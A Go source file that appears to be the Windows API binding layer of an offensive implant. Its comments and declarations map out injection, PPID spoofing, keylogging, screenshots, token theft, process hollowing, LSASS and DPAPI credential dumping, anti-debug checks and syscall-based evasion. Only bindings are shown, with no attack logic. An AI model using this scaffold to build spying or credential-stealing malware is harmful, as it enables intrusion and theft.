//go:build windows

package winsyscall

import "golang.org/x/sys/windows"

// Memory protection / allocation constants
const (
	MemCommit    uint32 = 0x1000
	MemReserve   uint32 = 0x2000
	MemRelease   uint32 = 0x8000

	PageNoAccess         uint32 = 0x01
	PageReadWrite        uint32 = 0x04
	PageExecRead         uint32 = 0x20
	PageExecuteReadWrite uint32 = 0x40

	ProcessAllAccess uint32 = 0x1F0FFF
	ThreadAllAccess  uint32 = 0x1F03FF

	Th32csSnapThread  uint32 = 0x00000004
	Th32csSnapProcess uint32 = 0x00000002

	// Section / mapped view (NtCreateSection / NtMapViewOfSection)
	SecCommit   uintptr = 0x8000000
	SecNoChange uintptr = 0x0400000
	ViewShare   uintptr = 1

	// PPID spoofing
	ExtendedStartupInfoPresent       uint32  = 0x00080000
	ProcThreadAttributeParentProcess uintptr = 0x00020000
	CreateNewConsole                 uint32  = 0x00000010

	// Token manipulation
	TokenAllAccess          uint32 = 0xF01FF
	SecurityImpersonation   uint32 = 2
	TokenTypePrimary        uint32 = 1
	TokenTypeImpersonation  uint32 = 2
	Logon32LogonInteractive uint32 = 2
	Logon32ProviderDefault  uint32 = 0

	// GDI / screenshot
	Srccopy      uint32 = 0x00CC0020
	SmCxscreen         = 0
	SmCyscreen         = 1
	DibRGBColors       = 0
	BiRgb              = 0
)

// Module handles
var (
	ModKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ModUser32   = windows.NewLazySystemDLL("user32.dll")
	ModGdi32    = windows.NewLazySystemDLL("gdi32.dll")
	ModAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	ModNtdll    = windows.NewLazySystemDLL("ntdll.dll")
	ModDbgHelp  = windows.NewLazySystemDLL("dbghelp.dll")
	ModCrypt32  = windows.NewLazySystemDLL("crypt32.dll")
)

// Proc declarations — injection
var (
	ProcCreateThread       = ModKernel32.NewProc("CreateThread")
	ProcVirtualAllocEx     = ModKernel32.NewProc("VirtualAllocEx")
	ProcVirtualFreeEx      = ModKernel32.NewProc("VirtualFreeEx")
	ProcWriteProcessMemory = ModKernel32.NewProc("WriteProcessMemory")
	ProcCreateRemoteThread = ModKernel32.NewProc("CreateRemoteThread")
	ProcQueueUserAPC       = ModKernel32.NewProc("QueueUserAPC")
	ProcOpenThread         = ModKernel32.NewProc("OpenThread")
	ProcVirtualProtect     = ModKernel32.NewProc("VirtualProtect")
)

// Proc declarations — thread/process enumeration
var (
	ProcCreateToolhelp32Snapshot = ModKernel32.NewProc("CreateToolhelp32Snapshot")
	ProcThread32First            = ModKernel32.NewProc("Thread32First")
	ProcThread32Next             = ModKernel32.NewProc("Thread32Next")
	ProcProcess32First           = ModKernel32.NewProc("Process32FirstW")
	ProcProcess32Next            = ModKernel32.NewProc("Process32NextW")
)

// Proc declarations — PPID spoofing
var (
	ProcInitializeProcThreadAttributeList = ModKernel32.NewProc("InitializeProcThreadAttributeList")
	ProcUpdateProcThreadAttribute         = ModKernel32.NewProc("UpdateProcThreadAttribute")
	ProcDeleteProcThreadAttributeList     = ModKernel32.NewProc("DeleteProcThreadAttributeList")
)

// Proc declarations — keylogger
var (
	ProcGetAsyncKeyState = ModUser32.NewProc("GetAsyncKeyState")
	ProcGetKeyState      = ModUser32.NewProc("GetKeyState")
)

// Proc declarations — screenshot (GDI)
var (
	ProcGetDC                  = ModUser32.NewProc("GetDC")
	ProcGetWindowDC            = ModUser32.NewProc("GetWindowDC")
	ProcReleaseDC              = ModUser32.NewProc("ReleaseDC")
	ProcGetDesktopWindow       = ModUser32.NewProc("GetDesktopWindow")
	ProcGetSystemMetrics       = ModUser32.NewProc("GetSystemMetrics")
	ProcCreateCompatibleDC     = ModGdi32.NewProc("CreateCompatibleDC")
	ProcCreateCompatibleBitmap = ModGdi32.NewProc("CreateCompatibleBitmap")
	ProcSelectObject           = ModGdi32.NewProc("SelectObject")
	ProcBitBlt                 = ModGdi32.NewProc("BitBlt")
	ProcGetDIBits              = ModGdi32.NewProc("GetDIBits")
	ProcDeleteObject           = ModGdi32.NewProc("DeleteObject")
	ProcDeleteDC               = ModGdi32.NewProc("DeleteDC")
)

// Proc declarations — token / privilege
var (
	ProcLogonUser               = ModAdvapi32.NewProc("LogonUserW")
	ProcCreateProcessWithToken  = ModAdvapi32.NewProc("CreateProcessWithTokenW")
	ProcImpersonateLoggedOnUser = ModAdvapi32.NewProc("ImpersonateLoggedOnUser")
	ProcRevertToSelf            = ModAdvapi32.NewProc("RevertToSelf")
)

// Proc declarations — thread context / hollow / hijack
var (
	ProcGetThreadContext      = ModKernel32.NewProc("GetThreadContext")
	ProcSetThreadContext      = ModKernel32.NewProc("SetThreadContext")
	ProcSuspendThread         = ModKernel32.NewProc("SuspendThread")
	ProcResumeThread          = ModKernel32.NewProc("ResumeThread")
	ProcNtUnmapViewOfSection  = ModNtdll.NewProc("NtUnmapViewOfSection")
	ProcNtCreateSection       = ModNtdll.NewProc("NtCreateSection")
	ProcNtMapViewOfSection    = ModNtdll.NewProc("NtMapViewOfSection")
	ProcLoadLibraryA          = ModKernel32.NewProc("LoadLibraryA")
	ProcGetModuleHandleW      = ModKernel32.NewProc("GetModuleHandleW")
	ProcCreateTimerQueueTimer = ModKernel32.NewProc("CreateTimerQueueTimer")
	ProcDeleteTimerQueueTimer = ModKernel32.NewProc("DeleteTimerQueueTimer")
	ProcQueueUserWorkItem     = ModKernel32.NewProc("QueueUserWorkItem")
)

// Proc declarations — credential access
var (
	ProcMiniDumpWriteDump  = ModDbgHelp.NewProc("MiniDumpWriteDump")
	ProcCryptUnprotectData = ModCrypt32.NewProc("CryptUnprotectData")
	ProcRegSaveKeyW        = ModAdvapi32.NewProc("RegSaveKeyW")
	ProcOpenClipboard      = ModUser32.NewProc("OpenClipboard")
	ProcCloseClipboard     = ModUser32.NewProc("CloseClipboard")
	ProcGetClipboardData   = ModUser32.NewProc("GetClipboardData")
	ProcGlobalLock         = ModKernel32.NewProc("GlobalLock")
	ProcGlobalUnlock       = ModKernel32.NewProc("GlobalUnlock")
	ProcGlobalSize         = ModKernel32.NewProc("GlobalSize")
)

// Proc declarations — HWBP / VEH
var (
	ProcAddVectoredExceptionHandler    = ModKernel32.NewProc("AddVectoredExceptionHandler")
	ProcRemoveVectoredExceptionHandler = ModKernel32.NewProc("RemoveVectoredExceptionHandler")
)

// Proc declarations — anti-debug
var (
	ProcIsDebuggerPresent          = ModKernel32.NewProc("IsDebuggerPresent")
	ProcCheckRemoteDebuggerPresent = ModKernel32.NewProc("CheckRemoteDebuggerPresent")
	ProcNtQueryInformationProcess  = ModNtdll.NewProc("NtQueryInformationProcess")
	ProcGetTickCount64             = ModKernel32.NewProc("GetTickCount64")
	ProcOutputDebugStringW         = ModKernel32.NewProc("OutputDebugStringW")
)

// Proc declarations — sleep obfuscation (RC4 via SystemFunction032)
var (
	ProcSystemFunction032 = windows.NewLazySystemDLL("advapi32.dll").NewProc("SystemFunction032")
)

// Proc declarations — NT direct syscall stubs (used by Hell's Gate)
var (
	ProcNtProtectVirtualMemory  = ModNtdll.NewProc("NtProtectVirtualMemory")
	ProcNtAllocateVirtualMemory = ModNtdll.NewProc("NtAllocateVirtualMemory")
	ProcNtWriteVirtualMemory    = ModNtdll.NewProc("NtWriteVirtualMemory")
	ProcNtCreateThreadEx        = ModNtdll.NewProc("NtCreateThreadEx")
)

// Proc declarations — LSASS alternative dump techniques
var (
	ProcRtlReportSilentProcessExit = ModNtdll.NewProc("RtlReportSilentProcessExit")
	ProcNtDuplicateObject          = ModNtdll.NewProc("NtDuplicateObject")
)

// Proc declarations — .NET / CLR hosting
var (
	ProcCLRCreateInstance = windows.NewLazyDLL("mscoree.dll").NewProc("CLRCreateInstance")
)
